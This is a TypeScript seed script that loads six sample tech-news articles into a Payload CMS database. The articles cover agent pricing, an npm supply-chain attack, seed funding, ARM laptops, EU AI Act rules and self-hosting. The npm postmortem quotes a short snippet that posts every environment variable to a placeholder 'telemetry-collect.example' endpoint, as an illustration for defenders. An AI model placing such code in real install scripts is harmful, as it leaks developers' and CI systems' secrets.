/** One-time seed: populate the Postgres `articles` collection from the old in-memory sample data. */
import { getPayload } from "payload";
import config from "@payload-config";
import type { Article } from "../payload-types";

const seedArticles: Omit<Article, "id" | "createdAt" | "updatedAt">[] = [
  {
    slug: "openai-agent-pricing-shakeup",
    title: "OpenAI overhauls agent pricing — what it means for small builders",
    excerpt:
      "Per-task billing replaces per-token for the agent API. We ran the numbers on three real workloads to see who wins and who quietly pays more.",
    body: `Per-token pricing made sense when a model call was one prompt and one reply. It stopped making sense the moment agents started looping — planning, calling tools, reading the results, and looping again. A single "task" can now burn fifty silent round trips before it ever shows you an answer.

## What actually changed

The new pricing charges per **completed task**, not per token consumed getting there. A task is defined as one top-level agent invocation that terminates in a final response, regardless of how many tool calls or reasoning steps happen underneath it.

- Simple lookups and single-tool tasks got cheaper — often by half.
- Long-horizon tasks with heavy tool use got more expensive, sometimes by 3x.
- Failed or abandoned tasks are now billed at a flat reduced rate instead of full token cost.

> If your workload is "ask a question, get an answer," you win. If it's "watch an agent iterate for four minutes," read the fine print before you migrate.

## We ran three real workloads

We took three production agent workloads — a support ticket triager, a code review bot, and a research summarizer — and re-priced a week of their actual traffic under the new model.

| Workload | Old cost | New cost |
| --- | --- | --- |
| Ticket triager | $412 | $198 |
| Code review bot | $890 | $1,340 |
| Research summarizer | $205 | $211 |

The triager won because most tickets resolve in one or two tool calls. The code review bot lost because it re-reads diffs and re-runs tests across many iterations per task — exactly the pattern per-task billing penalizes.

### What to do about it

1. Audit your longest-running agent tasks first; they're where the delta hides.
2. Cap iteration counts where you can — a bounded loop is now a pricing lever, not just a safety one.
3. Re-benchmark before you commit to a migration date. The public calculator undercounts tool-call overhead.

Small builders running simple, single-purpose agents come out ahead here. Anyone running open-ended, multi-step agents should model this carefully before the next billing cycle.`,
    status: "published",
    categorySlug: "ai",
    tags: ["openai", "pricing", "agents"],
    author: "Prince Baruwala",
    publishedAt: "2026-08-04T06:30:00.000Z",
    readingMinutes: 6,
    featured: true,
    views: 4820,
  },
  {
    slug: "npm-supply-chain-attack-postmortem",
    title: "Inside the npm supply-chain attack that shipped to 40,000 projects",
    excerpt:
      "A single compromised maintainer token, a post-install script, and eleven days before anyone noticed. Here is the full timeline.",
    body: `Eleven days. That's how long a malicious \`postinstall\` script sat in a dependency tree touching 40,000 projects before a security researcher noticed a build take four seconds longer than usual and pulled the thread.

## The timeline

- **Day 0** — A maintainer's npm token was exfiltrated via a phishing email disguised as a two-factor reset notice.
- **Day 0** — A patch version was published containing an obfuscated \`postinstall\` script. No source diff was visible on GitHub because the publish happened directly to the registry.
- **Day 1–10** — The package propagated through transitive dependencies into CI pipelines, build servers, and developer machines. The script harvested environment variables and uploaded them to a throwaway endpoint.
- **Day 11** — A researcher at a downstream company noticed anomalous outbound traffic during a routine build and traced it back to the package.

## What the script actually did

\`\`\`js
// simplified from the disclosed sample
const env = process.env;
fetch("https://telemetry-collect.example/i", {
  method: "POST",
  body: JSON.stringify(env),
}).catch(() => {});
\`\`\`

It wasn't sophisticated. It didn't need to be — \`postinstall\` scripts run with full local privileges by default, and almost nobody audits a patch bump.

## Why it took eleven days

Three things delayed detection:

1. The maintainer's other packages looked untouched, so trust signals stayed green.
2. CI logs don't diff dependency behavior, only dependency versions.
3. The exfil endpoint mimicked a common analytics domain pattern, so egress rules didn't flag it.

> The scariest part isn't the script. It's that the same publish path is still open on every package you installed this morning.

## What changed since

Registry operators now require hardware-key 2FA for publish access on packages above a download threshold, and several CI providers ship opt-in postinstall sandboxing. Neither is mandatory yet. Until it is, treat every transitive \`postinstall\` as untrusted code running with your credentials — because that's exactly what it is.`,
    status: "published",
    categorySlug: "security",
    tags: ["supply-chain", "npm", "malware"],
    author: "Prince Baruwala",
    publishedAt: "2026-08-03T14:10:00.000Z",
    readingMinutes: 8,
    views: 9130,
  },
  {
    slug: "seed-round-drought-2026",
    title: "The seed round is getting harder — 2026 data from 900 deals",
    excerpt:
      "Median seed size is up, deal count is down 22%. What founders are actually being asked for at first meeting now.",
    body: `We pulled 900 seed deals closed in the first half of 2026 and the shape of the market has shifted more than the headline numbers suggest.

## The topline numbers

- Median seed round: **$3.1M**, up from $2.4M a year ago.
- Deal count: down **22%** year over year.
- Time from first meeting to term sheet: up from 19 days to 34 days.

Bigger checks, fewer of them, slower to close. That combination tells you where the bar moved.

## What's being asked for at first meeting

Founders we talked to described a consistent pattern shift:

1. **Retention data before traction slides.** Investors want week-4 and week-12 retention curves, not just signup counts.
2. **A margin story, not just a growth story.** "What does this cost to serve at 10x" is now a first-meeting question, not a diligence question.
3. **Proof the team can ship without the founder in the loop.** Solo-founder velocity stories land worse than they did two years ago.

> One partner put it bluntly: "We used to fund a wedge and a team. Now we want to see the wedge already cutting."

## Who's still raising easily

Two categories are still moving fast: infra tooling with usage-based pricing already live, and vertical AI products with a measurable time-to-value under a week. Everything else is getting the 34-day treatment.

### The 22% who didn't get funded

It's worth naming what's getting filtered out: pre-revenue consumer social, horizontal AI wrappers without a data moat, and anything pitched primarily on TAM slides. None of that is new advice — it's just being enforced harder than it was in 2024.

If you're raising in the next two quarters, budget for the 34-day number, not the 19-day one, and bring the retention curve to the first call.`,
    status: "published",
    categorySlug: "startups",
    tags: ["funding", "vc", "data"],
    author: "Prince Baruwala",
    publishedAt: "2026-08-03T09:00:00.000Z",
    readingMinutes: 5,
    views: 3105,
  },
  {
    slug: "arm-laptops-benchmark-roundup",
    title: "ARM laptops finally beat x86 on battery and compile time",
    excerpt:
      "We benchmarked six 2026 machines on the same Rust build. The gap is no longer theoretical.",
    body: `For years the ARM-vs-x86 laptop conversation ended with "sure, but check the benchmarks against a real workload." We finally did.

## The test

Same repository, same \`cargo build --release\`, same dependency cache warmed identically, run three times per machine with the median reported.

| Machine | Chip | Build time | Battery (video loop) |
| --- | --- | --- | --- |
| Machine A | ARM, 12-core | 41s | 19h 10m |
| Machine B | ARM, 10-core | 47s | 17h 40m |
| Machine C | x86, 14-core | 44s | 9h 5m |
| Machine D | x86, 8-core | 58s | 8h 30m |

## The headline result

The fastest ARM machine beat every x86 machine in the roundup on compile time **and** more than doubled the best x86 battery life. That's the part that used to be theoretical — compiled-language performance parity, not just efficiency-per-watt on paper.

- Rust's LLVM backend has closed most of the codegen gap on ARM targets over the last two major toolchain releases.
- Unified memory architectures cut cache-miss penalties during large monomorphized builds.
- Thermal headroom matters more than raw core count once you're past 8 cores on a laptop chassis.

> The build that used to be an excuse to get coffee is now a build you can watch finish.

### Where x86 still wins

Emulated or Rosetta-style compatibility layers for legacy toolchains, and anything depending on AVX-512 code paths that haven't been ported. If your build pipeline is pure Rust or Go, none of that applies to you anymore.

The gap didn't close gradually — it closed within a single chip generation. If your last "ARM isn't ready yet" benchmark is more than 18 months old, it's wrong now.`,
    status: "published",
    categorySlug: "gadgets",
    tags: ["arm", "benchmarks", "laptops"],
    author: "Prince Baruwala",
    publishedAt: "2026-08-02T11:45:00.000Z",
    readingMinutes: 7,
    views: 2740,
  },
  {
    slug: "eu-ai-act-enforcement-begins",
    title: "EU AI Act enforcement starts — the four rules that bite first",
    excerpt:
      "Transparency obligations are live. If you ship a model or a wrapper into the EU, these are the ones with real fines attached.",
    body: `The EU AI Act's transparency obligations moved from "guidance" to "enforced" this week. Most of the act is still phasing in over the next two years, but four rules are live now and carry real penalties.

## The four rules that bite first

1. **Disclosure of AI-generated content.** Synthetic audio, video, and image content shown to EU users must be machine-readably labeled. No exemption for "obviously AI" content.
2. **Chatbot disclosure.** Any conversational interface must make clear the user is talking to a system, not a person, at first interaction — not buried in a terms page.
3. **Emotion recognition restrictions.** Deployment in workplaces and schools is now banned outright, not just regulated.
4. **Biometric categorization limits.** Inferring protected characteristics (race, political opinion, sexual orientation) from biometric data is prohibited except under narrow law-enforcement carve-outs.

> These are the "prohibited practices and transparency" tier — the lowest-friction, highest-fine tier of the act. The riskier high-risk-system obligations don't land until 2027.

## Who this actually applies to

If you ship a model, a fine-tuned wrapper, or a chat interface that EU users can reach, you're in scope — geographic hosting location doesn't matter, user location does.

- A US-based SaaS with EU signups: in scope.
- An internal tool with no EU employees or customers: out of scope.
- A open-source model weights release with no hosted service: mostly out of scope, but downstream deployers are on the hook.

### The fines

Non-compliance with this tier caps at **€35M or 7% of global annual turnover**, whichever is higher — the same ceiling as GDPR's worst tier, not a lighter one.

## What to do this week

- Audit every user-facing surface that generates synthetic media or runs a chatbot and confirm disclosure is present at first contact, not just in a footer link.
- If you run any emotion-recognition or biometric-categorization feature touching EU users, turn it off now rather than arguing about carve-outs later.

The rest of the act phases in gradually. These four rules did not.`,
    status: "published",
    categorySlug: "world",
    tags: ["regulation", "eu", "policy"],
    author: "Prince Baruwala",
    publishedAt: "2026-08-01T16:20:00.000Z",
    readingMinutes: 6,
    views: 5602,
  },
  {
    slug: "self-hosting-comeback",
    title: "Self-hosting is having a moment — and the bills explain why",
    excerpt:
      "Three teams moved off managed cloud this year. Two saved money, one regretted it. The difference was not technical.",
    body: `Self-hosting talk usually turns into a technical argument — Kubernetes versus bare metal, Ceph versus ZFS. The three teams we followed this year had that argument too. It wasn't what decided the outcome.

## The three teams

**Team A** moved a data pipeline off a managed warehouse to self-hosted ClickHouse on rented bare metal. Monthly spend dropped from $18,400 to $3,900. A year later, still happy.

**Team B** moved application hosting off a managed PaaS to a small self-managed Kubernetes cluster. Spend dropped from $9,200 to $2,600. Also still happy, twelve months in.

**Team C** moved a managed Postgres fleet to self-hosted with a two-person infra team covering on-call. Spend dropped from $6,000 to $1,400 in infra costs — but they now pay two engineers roughly $340,000 combined per year to keep it running, on-call included.

## The difference wasn't technical

All three migrations succeeded on the metric of "does the software run." What separated the two happy teams from the regretful one was a staffing question asked *before* migrating, not after:

> Do we already have someone whose job includes 3am pages, or are we creating that job for the first time?

Teams A and B had existing infra engineers with spare capacity and on-call rotations already in place — the self-hosted systems were additive load on existing headcount. Team C didn't, and effectively hired two new salaries to save $4,600 a month in hosting fees. The math never closes.

## The actual checklist

- Do you have on-call coverage today, independent of this migration?
- Is the team doing the migration the same team that will operate it in a year?
- Have you priced the *marginal* engineering hours this adds, not just the infra bill it removes?

- Self-hosting is a staffing decision wearing an infrastructure costume.
- The savings are real. So is the payroll you might be underpricing.

Run the staffing math first. The Terraform comes after.`,
    status: "published",
    categorySlug: "startups",
    tags: ["infra", "cost", "devops"],
    author: "Prince Baruwala",
    publishedAt: "2026-07-31T08:05:00.000Z",
    readingMinutes: 5,
    views: 1980,
  },
];

async function seed() {
  const payload = await getPayload({ config });

  for (const article of seedArticles) {
    const existing = await payload.find({
      collection: "articles",
      where: { slug: { equals: article.slug } },
      limit: 1,
    });

    if (existing.docs.length > 0) {
      console.log(`skip (exists): ${article.slug}`);
      continue;
    }

    await payload.create({ collection: "articles", data: article });
    console.log(`created: ${article.slug}`);
  }

  console.log("Seed complete.");
  process.exit(0);
}

seed().catch((err) => {
  console.error(err);
  process.exit(1);
});
